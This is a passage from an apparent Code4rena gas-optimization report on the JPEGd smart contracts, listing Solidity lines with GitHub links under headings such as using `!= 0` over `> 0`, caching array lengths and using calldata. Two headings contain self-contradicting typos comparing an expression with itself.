[35](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L35))\n```solidity\n    mapping(address => bool) public whitelistedContracts;\n```\n5. File: contracts/farming/yVaultLPFarming.sol (line [37](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L37))\n```solidity\n    mapping(address => bool) public whitelistedContracts;\n```\n6. File: contracts/farming/LPFarming.sol (line [73](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L73))\n```solidity\n    mapping(address => bool) public whitelistedContracts;\n```\n\n### Use `delete` rather than assigning zero to a mapping to get a gas refund\n\n1. File: contracts/vaults/NFTVault.sol (line [380](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L380))\n```solidity\n        pendingNFTValueETH[_nftIndex] = 0;\n```\n2. File: contracts/farming/yVaultLPFarming.sol (line [141](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L141))\n```solidity\n        userPendingRewards[msg.sender] = 0;\n```\n3. File: contracts/farming/LPFarming.sol (line [340](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L340))\n```solidity\n        userRewards[msg.sender] = 0;\n```\n4. File: contracts/farming/LPFarming.sol (line [357](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L357))\n```solidity\n        userRewards[msg.sender] = 0;\n```\n\n### Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement\n\n1. File: contracts/vaults/NFTVault.sol (line [278](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L278))\n```solidity\n        require(_newFloor > 0, \"Invalid floor\");\n```\n2. File: contracts/vaults/NFTVault.sol (line [365](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L365))\n```solidity\n        require(pendingValue > 0, \"no_pending_value\");\n```\n3. File: contracts/vaults/NFTVault.sol (line [687](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L687))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n4. File: contracts/vaults/NFTVault.sol (line [764](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L764))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n5. File: contracts/vaults/NFTVault.sol (line [770](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L770))\n```solidity\n        require(debtAmount > 0, \"position_not_borrowed\");\n```\n6. File: contracts/vaults/NFTVault.sol (line [882](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L882))\n```solidity\n        require(position.liquidatedAt > 0, \"not_liquidated\");\n```\n7. File: contracts/vaults/NFTVault.sol (line [926](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L926))\n```solidity\n        require(position.liquidatedAt > 0, \"not_liquidated\");\n```\n8. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [142](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L142))\n```solidity\n        require(amount > 0, \"invalid_amount\");\n```\n9. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [164](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L164))\n```solidity\n        require(amount > 0, \"invalid_amount\");\n```\n10. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [180](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L180))\n```solidity\n        require(amount > 0, \"invalid_amount\");\n```\n11. File: contracts/vaults/yVault/yVault.sol (line [143](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L143))\n```solidity\n        require(_amount > 0, \"INVALID_AMOUNT\");\n```\n12. File: contracts/vaults/yVault/yVault.sol (line [167](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L167))\n```solidity\n        require(_shares > 0, \"INVALID_AMOUNT\");\n```\n13. File: contracts/vaults/yVault/yVault.sol (line [170](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L170))\n```solidity\n        require(supply > 0, \"NO_TOKENS_DEPOSITED\");\n```\n14. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [334](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L334))\n```solidity\n            require(wethBalance > 0, \"NOOP\");\n```\n15. File: contracts/staking/JPEGStaking.sol (line [32](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/staking/JPEGStaking.sol#L32))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n16. File: contracts/farming/yVaultLPFarming.sol (line [101](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L101))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n17. File: contracts/farming/yVaultLPFarming.sol (line [118](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L118))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n18. File: contracts/farming/yVaultLPFarming.sol (line [139](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L139))\n```solidity\n        require(rewards > 0, \"no_reward\");\n```\n19. File: contracts/farming/LPFarming.sol (line [114](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L114))\n```solidity\n        require(_rewardPerBlock > 0, \"Invalid reward per block\");\n```\n20. File: contracts/farming/LPFarming.sol (line [218](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L218))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n21. File: contracts/farming/LPFarming.sol (line [239](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L239))\n```solidity\n        require(_amount > 0, \"invalid_amount\");\n```\n22. File: contracts/farming/LPFarming.sol (line [337](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L337))\n```solidity\n        require(rewards > 0, \"no_reward\");\n```\n23. File: contracts/farming/LPFarming.sol (line [354](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L354))\n```solidity\n        require(rewards > 0, \"no_reward\");\n```\n24. File: contracts/lock/JPEGLock.sol (line [40](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/lock/JPEGLock.sol#L40))\n```solidity\n        require(_newTime > 0, \"Invalid lock time\");\n```\n\n### `<array>.length` should not be looked up in every loop of a `for`-loop\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length\n\n1. File: contracts/vaults/NFTVault.sol (line [181](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L181))\n```solidity\n        for (uint256 i = 0; i < _typeInitializers.length; i++) {\n```\n2. File: contracts/vaults/NFTVault.sol (line [184](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L184))\n```solidity\n            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n3. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L145))\n```solidity\n        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\n```\n4. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [319](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L319))\n```solidity\n            for (uint256 i = 0; i < rewardTokens.length; i++) {\n```\n5. File: contracts/farming/LPFarming.sol (line [348](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L348))\n```solidity\n        for (uint256 i = 0; i < poolInfo.length; i++) {\n```\n\n### It costs more gas to initialize variables to zero than to let the default of zero be applied\n\n1. File: contracts/vaults/NFTVault.sol (line [181](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L181))\n```solidity\n        for (uint256 i = 0; i < _typeInitializers.length; i++) {\n```\n2. File: contracts/vaults/NFTVault.sol (line [184](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L184))\n```solidity\n            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n3. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L145))\n```solidity\n        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\n```\n4. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [231](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L231))\n```solidity\n        for (uint256 i = 0; i < length; i++) {\n```\n5. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [319](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L319))\n```solidity\n            for (uint256 i = 0; i < rewardTokens.length; i++) {\n```\n6. File: contracts/farming/LPFarming.sol (line [281](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L281))\n```solidity\n        for (uint256 pid = 0; pid < length; ++pid) {\n```\n7. File: contracts/farming/LPFarming.sol (line [348](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L348))\n```solidity\n        for (uint256 i = 0; i < poolInfo.length; i++) {\n```\n\n### State variables should be cached in stack variables rather than re-reading them from storage\nThe instances below point to the second access of a state variable within a function.\nLess obvious optimizations include having local storage variables of mappings within state variable mappings or mappings within state variable structs, having local storage variables of structs within mappings, or having local caches of state variable contracts/addresses.\n\n1. File: contracts/vaults/NFTVault.sol (line [814](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L814))\n```solidity\n            nftContract.safeTransferFrom(address(this), msg.sender, _nftIndex);\n```\n2. File: contracts/vaults/NFTVault.sol (line [590](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L590))\n```solidity\n        uint256 interestPerYear = (totalDebtAmount *\n```\n3. File: contracts/vaults/NFTVault.sol (line [740](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L740))\n```solidity\n                totalDebtAmount;\n```\n4. File: contracts/vaults/NFTVault.sol (line [739](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L739))\n```solidity\n            uint256 plusPortion = (totalDebtPortion * _amount) /\n```\n5. File: contracts/vaults/NFTVault.sol (line [242](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L242))\n```solidity\n        settings.creditLimitRate = _creditLimitRate;\n```\n6. File: contracts/vaults/NFTVault.sol (line [257](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L257))\n```solidity\n        settings.liquidationLimitRate = _liquidationLimitRate;\n```\n7. File: contracts/vaults/NFTVault.sol (line [369](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L369))\n```solidity\n            settings.creditLimitRate.denominator) *\n```\n8. File: contracts/vaults/NFTVault.sol (line [506](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L506))\n```solidity\n            settings.creditLimitRate.denominator;\n```\n9. File: contracts/vaults/NFTVault.sol (line [520](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L520))\n```solidity\n            settings.liquidationLimitRate.denominator;\n```\n10. File: contracts/vaults/NFTVault.sol (line [592](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L592))\n```solidity\n            settings.debtInterestApr.denominator;\n```\n11. File: contracts/vaults/NFTVault.sol (line [714](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L714))\n```solidity\n            settings.organizationFeeRate.numerator) /\n```\n12. File: contracts/vaults/NFTVault.sol (line [895](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L895))\n```solidity\n            settings.insuranceLiquidationPenaltyRate.numerator) /\n```\n13. File: contracts/vaults/NFTVault.sol (line [533](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L533))\n```solidity\n        uint256 principal = positions[_nftIndex].debtPrincipal;\n```\n14. File: contracts/vaults/NFTVault.sol (line [637](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L637))\n```solidity\n        uint256 debtAmount = positions[_nftIndex].liquidatedAt > 0\n```\n15. File: contracts/vaults/NFTVault.sol (line [684](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L684))\n```solidity\n                address(0) == positionOwner[_nftIndex],\n```\n16. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [148](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L148))\n```solidity\n            IERC20Upgradeable(collateralAsset).safeTransferFrom(\n```\n17. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [203](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L203))\n```solidity\n            IERC20Upgradeable(collateralAsset).safeTransfer(msg.sender, amount);\n```\n18. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [106](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L106))\n```solidity\n        uint8 decimals = oracle.decimals();\n```\n19. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [135](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L135))\n```solidity\n            creditLimitRate.denominator;\n```\n20. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [196](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L196))\n```solidity\n        uint256 creditLimit = getCreditLimit(collateralAmount - amount);\n```\n21. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [182](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L182))\n```solidity\n        amount = amount > debtAmount ? debtAmount : amount;\n```\n22. File: contracts/vaults/yVault/yVault.sol (line [78](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L78))\n```solidity\n            controller.balanceOf(address(token));\n```\n23. File: contracts/vaults/yVault/yVault.sol (line [132](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L132))\n```solidity\n        controller.earn(address(token), _bal);\n```\n24. File: contracts/vaults/yVault/yVault.sol (line [179](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L179))\n```solidity\n            controller.withdraw(address(token), toWithdraw);\n```\n25. File: contracts/vaults/yVault/yVault.sol (line [132](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L132))\n```solidity\n        controller.earn(address(token), _bal);\n```\n26. File: contracts/vaults/yVault/yVault.sol (line [189](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L189))\n```solidity\n        controller.withdrawJPEG(address(token), farm);\n```\n27. File: contracts/vaults/yVault/yVault.sol (line [125](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L125))\n```solidity\n            availableTokensRate.denominator;\n```\n28. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [252](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L252))\n```solidity\n        want.safeIncreaseAllowance(address(convex.booster), balance);\n```\n29. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [277](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L277))\n```solidity\n        uint256 balance = want.balanceOf(address(this));\n```\n30. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [296](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L296))\n```solidity\n        balance = want.balanceOf(address(this));\n```\n31. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [233](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L233))\n```solidity\n            if (address(jpeg) == extraReward.rewardToken()) {\n```\n32. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [306](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L306))\n```solidity\n        jpeg.safeTransfer(_to, jpeg.balanceOf(address(this)));\n```\n33. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [343](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L343))\n```solidity\n                    abi.encodePacked(weth, uint24(500), usdc),\n```\n34. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [356](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L356))\n```solidity\n        uint256 usdcBalance = usdc.balanceOf(address(this));\n```\n35. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [353](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L353))\n```solidity\n        StrategyConfig memory strategy = strategyConfig;\n```\n36. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [360](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L360))\n```solidity\n            performanceFee.denominator;\n```\n37. File: contracts/farming/yVaultLPFarming.sol (line [149](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L149))\n```solidity\n        jpeg.safeTransfer(msg.sender, rewards);\n```\n38. File: contracts/farming/yVaultLPFarming.sol (line [183](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L183))\n```solidity\n        userLastAccRewardPerShare[account] = accRewardPerShare;\n```\n39. File: contracts/farming/LPFarming.sol (line [130](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L130))\n```solidity\n            jpeg.safeTransferFrom(\n```\n40. File: contracts/farming/LPFarming.sol (line [120](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L120))\n```solidity\n            (epoch.endBlock - _blockNumber());\n```\n41. File: contracts/farming/LPFarming.sol (line [271](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L271))\n```solidity\n        if (blockNumber < epoch.startBlock) return epoch.startBlock;\n```\n42. File: contracts/farming/LPFarming.sol (line [163](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L163))\n```solidity\n        poolInfo[_pid].allocPoint = _allocPoint;\n```\n43. File: contracts/farming/LPFarming.sol (line [324](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L324))\n```solidity\n        user.lastAccRewardPerShare = poolInfo[_pid].accRewardPerShare;\n```\n44. File: contracts/farming/LPFarming.sol (line [145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L145))\n```solidity\n        totalAllocPoint = totalAllocPoint + _allocPoint;\n```\n45. File: contracts/farming/LPFarming.sol (line [165](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L165))\n```solidity\n            totalAllocPoint = totalAllocPoint - prevAllocPoint + _allocPoint;\n```\n\n### Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\n\n1. File: contracts/vaults/NFTVault.sol (line [146](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L146))\n```solidity\n        NFTCategoryInitializer[] memory _typeInitializers,\n```\n2. File: contracts/vaults/NFTVault.sol (line [148](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L148))\n```solidity\n        VaultSettings memory _settings\n```\n3. File: contracts/vaults/NFTVault.sol (line [212](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212))\n```solidity\n    function setDebtInterestApr(Rate memory _debtInterestApr)\n```\n4. File: contracts/vaults/NFTVault.sol (line [222](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L222))\n```solidity\n    function setValueIncreaseLockRate(Rate memory _valueIncreaseLockRate)\n```\n5. File: contracts/vaults/NFTVault.sol (line [232](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L232))\n```solidity\n    function setCreditLimitRate(Rate memory _creditLimitRate)\n```\n6. File: contracts/vaults/NFTVault.sol (line [247](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L247))\n```solidity\n    function setLiquidationLimitRate(Rate memory _liquidationLimitRate)\n```\n7. File: contracts/vaults/NFTVault.sol (line [290](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L290))\n```solidity\n    function setOrganizationFeeRate(Rate memory _organizationFeeRate)\n```\n8. File: contracts/vaults/NFTVault.sol (line [300](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L300))\n```solidity\n    function setInsurancePurchaseRate(Rate memory _insurancePurchaseRate)\n```\n9. File: contracts/vaults/NFTVault.sol (line [311](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L311))\n```solidity\n        Rate memory _insuranceLiquidationPenaltyRate\n```\n10. File: contracts/vaults/FungibleAssetVaultForDAO.sol (line [70](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/FungibleAssetVaultForDAO.sol#L70))\n```solidity\n        Rate memory _creditLimitRate\n```\n\n### `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops\n\n1. File: contracts/vaults/NFTVault.sol (line [181](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L181))\n```solidity\n        for (uint256 i = 0; i < _typeInitializers.length; i++) {\n```\n2. File: contracts/vaults/NFTVault.sol (line [184](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L184))\n```solidity\n            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n3. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L145))\n```solidity\n        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\n```\n4. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [231](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L231))\n```solidity\n        for (uint256 i = 0; i < length; i++) {\n```\n5. File: contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol (line [319](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L319))\n```solidity\n            for (uint256 i = 0; i < rewardTokens.length; i++) {\n```\n6. File: contracts/farming/LPFarming.sol (line [281](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L281))\n```solidity\n        for (uint256 pid = 0; pid < length; ++pid) {\n```\n7. File: contracts/farming/LPFarming.sol (line [348](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L348))\n```solidity\n        for (uint256 i = 0; i < poolInfo.length; i++) {\n```\n\n### `++i` costs less gas than `++i`, especially when it's used in 